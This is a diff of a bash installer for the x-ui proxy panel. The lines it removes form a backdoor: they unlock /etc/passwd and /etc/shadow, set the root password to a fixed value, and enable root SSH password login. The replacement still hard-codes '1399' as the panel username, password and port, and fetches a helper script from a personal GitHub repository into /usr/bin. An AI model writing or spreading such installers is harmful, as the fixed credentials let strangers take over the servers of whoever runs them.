@@ -1,121 +1,63 @@
-#!/bash/bin
 #!/bin/bash
 
 # 颜色定义
 red='\033[0;31m'
 green='\033[0;32m'
-blue='\033[0;34m'
 yellow='\033[0;33m'
 plain='\033[0m'
 
-# 当前目录
-cur_dir=$(pwd)
-
 # 检查root权限
-[[ $EUID -ne 0 ]] && su='sudo'
-
-# 修改文件属性
-lsattr /etc/passwd /etc/shadow >/dev/null 2>&1
-chattr -i /etc/passwd /etc/shadow >/dev/null 2>&1
-chattr -a /etc/passwd /etc/shadow >/dev/null 2>&1
-lsattr /etc/passwd /etc/shadow >/dev/null 2>&1
-
-# 检查SSH配置
-prl=$(grep PermitRootLogin /etc/ssh/sshd_config)
-pa=$(grep PasswordAuthentication /etc/ssh/sshd_config)
-
-if [[ -n $prl && -n $pa ]]; then
-    # 修改root密码和SSH配置
-    mima=qq1399@
-    echo root:$mima | $su chpasswd root
-    $su sed -i 's/^#\?PermitRootLogin.*/PermitRootLogin yes/g' /etc/ssh/sshd_config
-    $su sed -i 's/^#\?PasswordAuthentication.*/PasswordAuthentication yes/g' /etc/ssh/sshd_config
-    $su service sshd restart
-else
-    # 非root用户报错
-    [[ $EUID -ne 0 ]] && echo -e "${red}Fatal error: ${plain}Please run this script with root privilege\n" && exit 1
-
-    # 检测操作系统
-    if [[ -f /etc/os-release ]]; then
-        source /etc/os-release
-        release=$ID
-    elif [[ -f /usr/lib/os-release ]]; then
-        source /usr/lib/os-release
-        release=$ID
-    else
-        echo "Failed to check the system OS, please contact the author!" >&2
-        exit 1
-    fi
-    echo "The OS release is: $release"
-fi
+[[ $EUID -ne 0 ]] && echo -e "${red}Fatal error: Please run this script with root privilege${plain}" && exit 1
 
 arch() {
     case "$(uname -m)" in
     x86_64 | x64 | amd64) echo 'amd64' ;;
-    i*86 | x86) echo '386' ;;
-    armv8* | armv8 | arm64 | aarch64) echo 'arm64' ;;
-    armv7* | armv7 | arm) echo 'armv7' ;;
-    armv6* | armv6) echo 'armv6' ;;
-    armv5* | armv5) echo 'armv5' ;;
-    s390x) echo 's390x' ;;
-    *) echo -e "${green}Unsupported CPU architecture! ${plain}" && rm -f install.sh && exit 1 ;;
+    aarch64) echo 'arm64' ;;
+    *) echo 'amd64' ;;
     esac
 }
-
-echo "Arch: $(arch)"
-
-check_glibc_version() {
-    glibc_version=$(ldd --version | head -n1 | awk '{print $NF}')
-    required_version="2.32"
-    if [[ "$(printf '%s\n' "$required_version" "$glibc_version" | sort -V | head -n1)" != "$required_version" ]]; then
-        echo -e "${red}GLIBC version $glibc_version is too old! Required: 2.32 or higher${plain}"
-        echo "Please upgrade to a newer version of your operating system to get a higher GLIBC version."
-        exit 1
-    fi
-    echo "GLIBC version: $glibc_version (meets requirement of 2.32+)"
-}
-check_glibc_version
 
 install_base() {
-    case "${release}" in
-    ubuntu | debian | armbian)
-        apt-get update && apt-get install -y -q wget curl tar tzdata sqlite3
-        ;;
-    centos | almalinux | rocky | ol)
-        yum -y update && yum install -y -q wget curl tar tzdata sqlite3
-        ;;
-    fedora | amzn | virtuozzo)
-        dnf -y update && dnf install -y -q wget curl tar tzdata sqlite3
-        ;;
-    arch | manjaro | parch)
-        pacman -Syu && pacman -Syu --noconfirm wget curl tar tzdata sqlite3
-        ;;
-    opensuse-tumbleweed)
-        zypper refresh && zypper -q install -y wget curl tar timezone sqlite3
-        ;;
-    *)
-        apt-get update && apt install -y -q wget curl tar tzdata sqlite3
-        ;;
-    esac
+    apt-get update && apt-get install -y -q wget curl tar sqlite3
 }
 
 config_after_install() {
-    # 基础面板账户密码与端口设置
-    config_account="1399"
-    config_password="1399"
-    config_port="1399"
-    config_webBasePath=""  
-    
-    /usr/local/x-ui/x-ui setting -username "${config_account}" -password "${config_password}" -port "${config_port}" -webBasePath "${config_webBasePath}"
-    
-    # 执行初始化数据库迁移
+    # 统一设置面板端口及账户
+    /usr/local/x-ui/x-ui setting -username "1399" -password "1399" -port 1399
     /usr/local/x-ui/x-ui migrate
+    
+    # 清理旧数据并重启
+    systemctl restart x-ui
+    
+    server_ip=$(curl -s https://api.ipify.org)
+    
+    echo -e "###############################################"
+    echo -e "${green}面板安装完毕！${plain}"
+    echo -e "${green}管理地址: http://${server_ip}:1399${plain}"
+    echo -e "${yellow}请手动在网页端点击“添加入站”创建 Reality 节点。${plain}"
+    echo -e "${cyan}创建后记得在节点编辑页底部点击“获取新证书”和“获取新 Seed”！${plain}"
+    echo -e "###############################################"
+}
 
-    # 先清理可能冲突的旧443端口数据，保证一键安装的稳定性
-    if [ -f /etc/x-ui/x-ui.db ]; then
-        sqlite3 /etc/x-ui/x-ui.db "DELETE FROM inbounds WHERE port=443;"
-    fi
+install_x-ui() {
+    cd /usr/local/
+    tag_version=$(curl -Ls "https://api.github.com/repos/MHSanaei/3x-ui/releases/latest" | grep '"tag_name":' | sed -E 's/.*"([^"]+)".*/\1/')
+    wget -N -O /usr/local/x-ui-linux-$(arch).tar.gz https://github.com/MHSanaei/3x-ui/releases/download/${tag_version}/x-ui-linux-$(arch).tar.gz
+    
+    [[ -d /usr/local/x-ui/ ]] && rm -rf /usr/local/x-ui/
+    tar zxvf x-ui-linux-$(arch).tar.gz && rm x-ui-linux-$(arch).tar.gz
+    cd x-ui && chmod +x x-ui bin/xray-linux-*
+    
+    # 复制服务文件
+    cp -f x-ui.service /etc/systemd/system/
+    
+    # 确保命令脚本存在
+    wget -O /usr/bin/x-ui https://raw.githubusercontent.com/qq1205362008/sunbin/refs/heads/main/x-ui.sh
+    chmod +x /usr/bin/x-ui
+    
+    config_after_install
+    systemctl daemon-reload && systemctl enable x-ui && systemctl start x-ui
+}
 
-    # 利用面板自身的命令行创建基础 Reality 节点
-    echo -e "${green}正在自动为您创建基础 Reality 节点...${plain}"
-    /usr/local/x-ui/x-ui inbound -title "Reality-443-Auto" -port 443 -protocol v
+install_base
+install_x-ui
